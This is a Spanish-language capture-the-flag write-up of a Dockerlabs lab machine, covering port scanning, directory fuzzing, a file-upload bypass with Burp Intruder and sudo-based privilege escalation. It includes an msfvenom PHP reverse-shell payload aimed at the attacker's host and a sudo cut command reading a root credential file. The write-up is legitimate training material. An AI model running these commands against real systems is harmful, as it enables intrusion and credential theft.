# Dockerlabs

* Máquina **atacante** -> 172.17.0.1
* Máquina **objetivo** -> 172.17.0.2 | Linux :penguin:

### Escaneo de puertos

Realizamos un escaneo de puertos con *nmap* para ver puertos abiertos de la máquina **objetivo**:
```shell
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 172.17.0.2
```
![scan](/Capturas/2024-12-05_17-48.png)

La máquina solamente presenta el puerto **80** abierto.

### HTTP

Al buscar la dirección en nuestro navegador, vemos que hay una página "imitación" de la plataforma **Dockerlabs** con alguna de sus máquinas, pero no podemos interactuar con ella:

![http](/Capturas/2024-12-05_17-52.png)

Por lo que procedemos a realizar **fuzzing web** con *gobuster* para buscar directorios ocultos:
```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .txt,.py,.php,.sh
```
![gobuster](/Capturas/2024-12-05_17-54.png)

Encontramos dos cosas interesantes, **/uploads** y **/machine.php**. La primera se trata de un directorio donde podemos acceder a los archivos subidos al servidor, y la segunda nos permite subir archivos a dicho servidor. Por lo que parecer ser que esta máquina presenta una vulnerabilidad de File Upload:

![uploads](/Capturas/2024-12-05_18-01.png)
![machine](/Capturas/2024-12-05_18-01_1.png)

Para explotar esta vulnerabilidad, crearemos un payload que nos otorgue una reverse shell de la máquina **objetivo** con *msfvenom*:
```shell
msfvenom -p php/reverse_php LHOST=172.17.0.1 LPORT=443 -f raw > payload.php
```
Una vez creado, lo subimos al servidor desde 172.17.0.2/machine.php y comprobamos que se ha subido en 172.17.0.2/uploads:

![archivo_subido](/Capturas/2024-12-05_18-34.png)

Pero nos reporta este mensaje, por lo que debemos realizar un Bypass para que se lo "coma".

### Burpsuite

Como no sabemos qué extensión puede permitirnos subir el archivo, vamos a usar *Burpsuite* para interceptar la petición, modificarla y así obtener éxito.

1. Volvemos a subir el archivo, pero interceptando la petición con *Burpsuite*.
![proxy](/Capturas/2024-12-05_18-40.png)

2. La enviamos al **intruder** y añadimos como variable "php" para poder ir probando diferentes extensiones hasta encontrar una que funcione.
![add](/Capturas/2024-12-05_18-48.png)

3. Ahora debemos seleccionar el mensaje de error, para que cuando nos devuelva un mensaje diferente percatarnos.
![error](/Capturas/2024-12-05_18-54.png)

4. Cargamos un diccionario de extensiones en el apartado de **payloads**.
![dicc](/Capturas/2024-12-05_18-58.png)

5. Iniciamos el ataque y vemos que una de las extensiones da éxito.
![start](/Capturas/2024-12-05_19-00.png)

Ahora simplemente, subimos el archivo con esa extensión y si nos vamos a /uploads, podemos ver que se ha subido con éxito:

![subidaexito](/Capturas/2024-12-05_19-02.png)

Finalmente nos ponemos a la escucha con *netcat* y nos enviamos la reverse shell.

### Escalada de privilegios

Al ejecutar el comando `sudo -l` nos muestran que podemos ejecutar *cut* y *grep* como usuario **root**:

![cutygrep](/Capturas/2024-12-05_19-32.png)

Por lo que ahora, debemos investigar la máquina para encontrar alguna pista que nos permita continuar con la escalada.

Tras un rato de investigación, observamos que en **/opt** existe un archivo.txt que nos da la pista que necesitábamos para finalizar la escalada:

![escal](/Capturas/2024-12-05_19-36.png)

Ahora, leemos el contenido de **/root/clave.txt** ejecutando cut o grep como **root**:
```shell
sudo /usr/bin/cut -d "" -f1 "/root/clave.txt"
```
![lectura](/Capturas/2024-12-05_19-37.png)

Y ya solo nos queda usar las credenciales...

![cred](/Capturas/2024-12-05_19-38.png)

Para ser **root** :triangular_flag_on_post: